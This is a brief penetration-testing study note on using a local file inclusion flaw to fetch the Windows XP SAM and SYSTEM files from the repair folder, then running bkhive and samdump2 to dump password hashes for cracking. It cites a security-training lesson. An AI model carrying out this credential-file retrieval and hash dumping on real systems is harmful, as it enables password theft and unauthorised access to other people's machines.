# cracking SAM LFI 2 SAM

(after windows xp, the SAM files are protected and cannot be retrieved live)

windows xp:

**NOTE: You have to use wget to get the files or else the encoding will be messed up!

~~~
system file: windows\repair\system
SAM file: windows\repair\sam 
~~~

After files are retrieved,
~~~
$ bkhive SYSTEM hive.txt
$ samdump2 SAM hive.txt
~~~

now you are able to crack the hashes

source: http://www.computersecuritystudent.com/SECURITY_TOOLS/PASSWORD_CRACKING/lesson2/
# ADD SCREENSHOTS
